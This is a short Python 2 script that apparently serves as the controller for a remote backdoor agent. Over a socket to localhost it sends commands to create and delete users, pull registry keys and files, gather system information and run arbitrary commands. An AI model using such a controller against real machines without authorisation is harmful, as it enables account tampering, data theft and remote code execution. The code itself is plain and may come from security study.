import socket, struct
from ctypes import *

def recv_data(sock):
    data_len, = struct.unpack("!I",sock.recv(4))
    return sock.recv(data_len)
    
def send_data(sock,data):
    data_len = len(data)
    sock.send(struct.pack("!I",data_len))
    sock.send(data)
    return
    
def main():
    command_list = ["CU" , "DU" , "DRK", "DF" , "GI" , "EC" ]
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 12345))
    while True:
        print "COMMANDS:"
        print "CU - Create User"
        print "DU - Delete User"
        print "DRK - Download Registry Key"
        print "DF - Download File"
        print "GI - Gather Information"
        print "EC - Execute Command"
        
        cmd = raw_input(recv_data(s))
        
        if cmd == "CU":
            send_data(s,cmd)
            send_data(s,raw_input(recv_data(s)))
            send_data(s,raw_input(recv_data(s)))
                    
        elif cmd == "DU":
            send_data(s,cmd)
            send_data(s,raw_input(recv_data(s)))
            
        elif cmd == "DRK":
            send_data(s,cmd)
            send_data(s,raw_input(recv_data(s)))
            send_data(s,raw_input(recv_data(s)))
            
            data = recv_data(s)
            while data != "DATA_COMPLETE":
                print data
                data = recv_data(s)
                
        elif cmd == "DF":
            send_data(s,cmd)
            print recv_data(s)
            send_data(s,raw_input())
            print recv_data(s)
            
        elif cmd == "GI":
            send_data(s,cmd)
            send_data(s,raw_input(recv_data(s)))
            print recv_data(s)
            
        elif cmd == "EC":
            send_data(s,cmd)
            print recv_data(s)
            send_data(s,raw_input())
            print recv_data(s)
            send_data(s,raw_input())
        
        else:
            print "INVALID"
    
        
    
main()
    
